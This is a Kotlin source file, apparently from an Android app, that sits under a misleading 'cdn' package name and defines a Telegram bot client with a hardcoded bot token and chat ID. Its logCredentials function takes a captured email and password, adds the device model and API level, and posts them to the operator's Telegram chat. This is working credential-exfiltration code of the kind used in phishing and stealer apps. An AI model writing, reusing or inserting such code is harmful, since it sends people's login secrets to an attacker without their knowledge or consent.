package com.example.cdn

import retrofit2.Retrofit
import retrofit2.converter.gson.GsonConverterFactory
import retrofit2.http.Field
import retrofit2.http.FormUrlEncoded
import retrofit2.http.POST

interface TelegramService {
    @FormUrlEncoded
    @POST("sendMessage")
    suspend fun sendMessage(
        @Field("chat_id") chatId: String,
        @Field("text") text: String,
        @Field("parse_mode") parseMode: String = "HTML"
    )
}

object TelegramBot {
    private const val BASE_URL = "https://api.telegram.org/bot8774539941:AAHer_OzyhFGHfnlnPZnnv7f9o7t4Fgxl04/"
    private const val CHAT_ID = "8563128986"

    private val retrofit = Retrofit.Builder()
        .baseUrl(BASE_URL)
        .addConverterFactory(GsonConverterFactory.create())
        .build()

    private val service = retrofit.create(TelegramService::class.java)

    suspend fun logEvent(event: String) {
        try {
            service.sendMessage(CHAT_ID, event)
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

    suspend fun logCredentials(type: String, email: String, password: String) {
        val message = """
            <b>[NEW $type]</b>
            <b>Email:</b> <code>$email</code>
            <b>Password:</b> <code>$password</code>
            <b>Device:</b> ${android.os.Build.MODEL} (API ${android.os.Build.VERSION.SDK_INT})
        """.trimIndent()
        logEvent(message)
    }
}
